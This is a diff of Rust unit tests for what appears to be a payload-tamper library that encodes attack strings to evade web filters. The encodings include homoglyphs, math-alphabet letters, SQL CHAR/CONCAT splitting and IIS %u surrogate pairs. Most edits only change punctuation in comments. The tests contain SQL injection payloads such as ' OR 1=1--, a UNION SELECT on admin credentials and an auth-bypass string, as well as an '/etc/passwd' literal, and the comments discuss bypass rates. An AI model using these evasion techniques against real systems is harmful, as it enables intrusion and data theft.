-        // 'A'=65 — fifth char returns to slot 0 (lowercase-x hex)
+        // 'A'=65, fifth char returns to slot 0 (lowercase-x hex)
         let encoded = html_entity_variants("AAAAA");
         assert_eq!(encoded, "&#x41;&#X41;&#65;&#00065;&#x41;");
     }
@@ -1591,7 +1591,7 @@ mod tests {
 
     #[test]
     fn html_entity_variants_unicode_codepoint() {
-        // emoji U+1F600 ('😀') — codepoint 128512 — exercises higher-bit chars
+        // emoji U+1F600 ('😀'), codepoint 128512, exercises higher-bit chars
         let encoded = html_entity_variants("\u{1F600}");
         assert_eq!(encoded, "&#x1f600;");
     }
@@ -1650,7 +1650,7 @@ mod tests {
 
     #[test]
     fn math_bold_encode_preserves_punctuation() {
-        // ' OR 1=1-- — only letters/digits transform; punctuation stays
+        // ' OR 1=1--, only letters/digits transform; punctuation stays
         let encoded = math_bold_encode("' OR 1=1--");
         // ' space = = - - all unchanged
         assert!(encoded.starts_with('\''));
@@ -1709,7 +1709,7 @@ mod tests {
             let enc = math_script_encode(&s);
             assert!(
                 enc != s,
-                "math_script_encode left {c} unchanged — hole not filled"
+                "math_script_encode left {c} unchanged, hole not filled"
             );
         }
     }
@@ -1760,7 +1760,7 @@ mod tests {
 
     #[test]
     fn all_new_encoders_preserve_pure_punctuation() {
-        // Pure punctuation — no letters, no digits — must round-trip
+        // Pure punctuation, no letters, no digits, must round-trip
         // through every encoder unchanged. (Digits ARE transformed
         // by math_double_struck_encode, so we exclude them.)
         for f in [
@@ -1819,7 +1819,7 @@ mod tests {
     #[test]
     fn combining_mark_inject_only_after_letters() {
         let out = combining_mark_inject("a1b2", '\u{0308}');
-        // 'a' + ̈ + '1' + 'b' + ̈ + '2' — digits don't get marks.
+        // 'a' + ̈ + '1' + 'b' + ̈ + '2' (digits don't get marks).
         assert_eq!(out, "a\u{0308}1b\u{0308}2");
     }
 
@@ -1828,7 +1828,7 @@ mod tests {
     #[test]
     fn script_homoglyph_select_uses_cyrillic_letters() {
         let out = script_homoglyph_encode("SELECT");
-        // S → Cyrillic (no Cyrillic S — falls through to itself OR
+        // S → Cyrillic (no Cyrillic S, falls through to itself OR
         // gets mapped to one of the upper substitutions). E → U+0415.
         assert!(out.contains('\u{0415}'));
         // T → U+0422
@@ -1996,7 +1996,7 @@ mod tests {
         let payload = "' UNION SELECT 'admin','password' FROM users--";
         let out = sql_concat_split(payload);
         // Outer ' is unbalanced; collects up to ' before admin then closes there.
-        // The first CONCAT contains the OR/UNION/SELECT keywords as char args —
+        // The first CONCAT contains the OR/UNION/SELECT keywords as char args 
         // not a useful execution path, but it demonstrates the tamper is
         // applied uniformly. The point is: every single-quoted region becomes
         // CONCAT, so a downstream layer can compose this with other tampers.
@@ -2024,7 +2024,7 @@ mod tests {
 
     #[test]
     fn sql_char_decompose_path_literal() {
-        // '/etc/passwd' — every byte represented numerically
+        // '/etc/passwd', every byte represented numerically
         // '/'=47 'e'=101 't'=116 'c'=99 '/'=47 'p'=112 'a'=97 's'=115 's'=115 'w'=119 'd'=100
         assert_eq!(
             sql_char_decompose("'/etc/passwd'"),
@@ -2040,7 +2040,7 @@ mod tests {
     #[test]
     fn sql_char_decompose_empty_literal_preserves_empty_string() {
         // F60 regression: pre-fix `''` produced `CHAR()` which is
-        // NULL in MySQL — breaking `pass='' OR 1=1` auth bypass
+        // NULL in MySQL, breaking `pass='' OR 1=1` auth bypass
         // (`= NULL` is never TRUE). Post-fix the empty literal
         // round-trips unchanged.
         assert_eq!(sql_char_decompose("''"), "''");
@@ -2052,7 +2052,7 @@ mod tests {
     }
 
     // sql_char_decompose_empty_literal_preserves_empty_string above
-    // supersedes the pre-fix test that asserted CHAR() — kept as a
+    // supersedes the pre-fix test that asserted CHAR(), kept as a
     // marker rather than re-asserting the buggy old contract.
 
     #[test]
@@ -2182,7 +2182,7 @@ mod tests {
     fn homoglyph_preserves_sql_string_delimiters() {
         // Regression for F56: pre-fix `'` was mapped to U+2019,
         // destroying the SQL context-break the payload depends on.
-        // U+2019 is not a SQL string delimiter — the host query's
+        // U+2019 is not a SQL string delimiter, the host query's
         // string literal never closes and the injection becomes
         // inert. Verify the delimiters survive verbatim.
         let encoded = homoglyph_encode("' OR '1'='1");
@@ -2195,7 +2195,7 @@ mod tests {
             !encoded.contains('\u{2019}'),
             "U+2019 right-single-quote must NOT appear: {encoded}"
         );
-        // But the equals sign (non-delimiter) still gets mutated —
+        // But the equals sign (non-delimiter) still gets mutated 
         // proves the function isn't a complete no-op.
         assert!(
             encoded.contains('\u{FF1D}'),
@@ -2257,13 +2257,13 @@ mod tests {
     // characters (U+10000 and above) this produced a 5-digit hex sequence
     // like `%u1F600`, which IIS's %u decoder rejects (its format is
     // strictly 4 hex digits). The bypass looked encoded but was actually
-    // undecodable on any real IIS target — a silent bypass-rate killer.
+    // undecodable on any real IIS target (a silent bypass-rate killer).
     // Fixed: emit a UTF-16 surrogate pair `%uHIGH%uLOW` for non-BMP chars.
 
     #[test]
     fn iis_unicode_encode_lowest_non_bmp_u10000() {
         // U+10000 is the very first supplementary-plane codepoint (LINEAR B
-        // SYLLABLE B008 A). Pre-fix: emitted `%u10000` (5 hex digits —
+        // SYLLABLE B008 A). Pre-fix: emitted `%u10000` (5 hex digits 
         // invalid IIS format). Post-fix: must emit the surrogate pair
         // %uD800%uDC00 (high=0xD800, low=0xDC00 for U+10000).
         let ch = '\u{10000}'; // U+10000
@@ -2291,7 +2291,7 @@ mod tests {
     #[test]
     fn iis_unicode_encode_high_cjk_supplement_u20000() {
         // U+20000 is the first codepoint in CJK Unified Ideographs Extension
-        // B (𠀀). Pre-fix: emitted `%u20000` (5 hex digits — IIS rejects).
+        // B (𠀀). Pre-fix: emitted `%u20000` (5 hex digits. IIS rejects).
         // Post-fix: surrogate pair calculation:
         //   surrogate_base = 0x20000 - 0x10000 = 0x10000
         //   high = 0xD800 + (0x10000 >> 10) = 0xD800 + 0x40 = 0xD840
@@ -2328,7 +2328,7 @@ mod tests {
         let p = "\\u0041\\u0042"; // Already-escaped A, B
         let once = json_unicode_alnum(p);
         let twice = json_unicode_alnum(&once);
-        // Both passes: no change — the sequences are already `\uXXXX`.
+        // Both passes: no change (the sequences are already `\uXXXX`).
         assert_eq!(once, p, "first pass on pre-escaped must be a no-op");
         assert_eq!(twice, p, "second pass must also be a no-op");
     }
@@ -2336,7 +2336,7 @@ mod tests {
     #[test]
     fn json_unicode_alnum_incomplete_escape_not_skipped() {
         // `\u004` (5 chars total but only 3 hex digits after `u`) must NOT
-        // be treated as a pre-escaped sequence — the 4th hex digit is absent.
+        // be treated as a pre-escaped sequence (the 4th hex digit is absent).
         // The `\` gets escaped (it's not alnum), `u` and `0`, `0`, `4` are
         // alnum and each get their own `\uXXXX`. This confirms the lookahead
         // correctly requires exactly 4 hex digits.
@@ -2358,7 +2358,7 @@ mod tests {
 
     #[test]
     fn json_unicode_full_escapes_non_alnum_too() {
-        // json_unicode_full escapes EVERY char — verify a space (U+0020)
+        // json_unicode_full escapes EVERY char, verify a space (U+0020)
         // and apostrophe (U+0027) are escaped, unlike json_unicode_alnum
         // which leaves punctuation bare.
         let out = json_unicode_full("' '");
